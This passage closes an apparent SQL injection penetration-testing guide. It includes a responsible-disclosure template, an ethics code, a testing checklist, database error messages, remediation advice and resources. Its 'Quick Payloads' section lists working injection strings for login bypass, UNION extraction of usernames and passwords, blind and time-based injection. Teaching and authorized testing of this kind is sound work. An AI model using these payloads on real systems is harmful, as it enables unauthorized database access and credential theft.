   - Use bug bounty platform if available
   - Provide clear reproduction steps
   - Include suggested remediation

3. **Timeline:**
   - Initial response: 24-48 hours expected
   - Fix development: 30-90 days typical
   - Public disclosure: After patch released
   - Common: 90-day disclosure deadline

4. **Bug Bounty Platforms:**
   - HackerOne
   - Bugcrowd
   - Synack
   - YesWeHack

**Disclosure Template:**
```
Subject: SQL Injection Vulnerability in [Application]

Dear Security Team,

I have identified a SQL injection vulnerability in your application
that could allow unauthorized access to the database.

Vulnerability Details:
- Type: SQL Injection (CWE-89)
- Severity: High/Critical
- Location: [URL/Parameter]
- Affected Versions: [Version numbers]

Reproduction Steps:
1. Navigate to [URL]
2. Submit payload: [Payload]
3. Observe [Result]

Impact:
- Unauthorized data access
- Potential data modification
- Authentication bypass

Suggested Remediation:
- Implement parameterized queries
- Input validation
- WAF rules

I am available for further discussion and can provide additional
details if needed. I will keep this confidential until a patch is
released.

Please confirm receipt and provide an estimated timeline for
remediation.

Thank you,
[Your Name]
[Contact Information]
```

### Professional Ethics

**Penetration Testing Code of Ethics:**

1. **Confidentiality:**
   - Protect client data
   - Secure storage of findings
   - Limited disclosure

2. **Integrity:**
   - Accurate reporting
   - No exaggeration of findings
   - Honest assessment

3. **Objectivity:**
   - Unbiased testing
   - No conflicts of interest
   - Independent verification

4. **Professional Competence:**
   - Continuous learning
   - Stay current with techniques
   - Know limitations

5. **Legal Compliance:**
   - Follow all applicable laws
   - Respect boundaries
   - Document authorization

**Certifications Emphasizing Ethics:**
- **CEH (Certified Ethical Hacker):** EC-Council
- **OSCP (Offensive Security Certified Professional):** Offensive Security
- **GPEN (GIAC Penetration Tester):** SANS/GIAC
- **CPT (Certified Penetration Tester):** IACRB

---

## Quick Reference Guide

### Testing Checklist

- [ ] Obtain written authorization
- [ ] Define scope and boundaries
- [ ] Set up testing environment
- [ ] Identify injection points
- [ ] Test with single quote (')
- [ ] Determine database type
- [ ] Enumerate column count
- [ ] Identify data types
- [ ] Extract database version
- [ ] List tables and columns
- [ ] Extract sensitive data
- [ ] Test privilege escalation
- [ ] Document all findings
- [ ] Verify remediation
- [ ] Generate final report

### Common Error Messages

**MySQL:**
```
You have an error in your SQL syntax
Unknown column 'x' in 'field list'
Table 'database.table' doesn't exist
```

**PostgreSQL:**
```
ERROR: syntax error at or near "'"
ERROR: column "x" does not exist
ERROR: relation "table" does not exist
```

**Microsoft SQL Server:**
```
Incorrect syntax near ''
Invalid column name 'x'
Invalid object name 'table'
```

**Oracle:**
```
ORA-00933: SQL command not properly ended
ORA-00904: invalid identifier
ORA-00942: table or view does not exist
```

### Quick Payloads by Scenario

**Authentication Bypass:**
```
admin'--
admin' OR '1'='1
' OR 1=1--
') OR ('1'='1
```

**Data Extraction (2 columns):**
```
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Boolean Blind:**
```
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(password,1,1)='a'--
```

**Time-Based Blind (PostgreSQL):**
```
'; SELECT pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

**Error-Based (PostgreSQL):**
```
' AND 1=CAST((SELECT version()) AS int)--
```

### HTTP Status Codes to Monitor

- **200 OK:** Successful (check response content)
- **400 Bad Request:** Input validation triggered
- **403 Forbidden:** WAF blocked request
- **500 Internal Server Error:** SQL syntax error
- **503 Service Unavailable:** Database connection issues

---

## Conclusion

SQL injection remains a critical vulnerability despite being well-understood for decades. Success in both exploiting (for ethical testing) and defending against SQL injection requires:

**For Penetration Testers:**
- Systematic methodology
- Database-specific knowledge
- Tool proficiency (Burp Suite, sqlmap)
- Creative bypassing techniques
- Clear documentation

**For Developers:**
- Always use parameterized queries
- Never concatenate user input into SQL
- Implement input validation
- Follow least privilege principle
- Regular security testing

**For Security Teams:**
- Deploy WAF protection
- Enable comprehensive logging
- Monitor for suspicious patterns
- Conduct regular assessments
- Maintain incident response procedures

**Key Takeaway:** The only truly secure approach is parameterized queries/prepared statements. All other defenses are layered mitigation controls but not complete solutions.

---

## Additional Resources

**OWASP Resources:**
- SQL Injection Page: https://owasp.org/www-community/attacks/SQL_Injection
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

**PortSwigger Resources:**
- SQL Injection Tutorial: https://portswigger.net/web-security/sql-injection
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- All Labs: https://portswigger.net/web-security/all-labs

**Tool Documentation:**
- sqlmap: https://github.com/sqlmapproject/sqlmap/wiki
- Burp Suite: https://portswigger.net/burp/documentation
- OWASP ZAP: https://www.zaproxy.org/docs/

**Standards & Guidelines:**
- NIST SP 800-53: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final
- PCI DSS: https://www.pcisecuritystandards.org/
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- MITRE ATT&CK: https://attack.mitre.org/

---

**Document Version:** 1.0
**Last Updated:** 2026-01-09
**Maintainer:** Penetration Testing Team
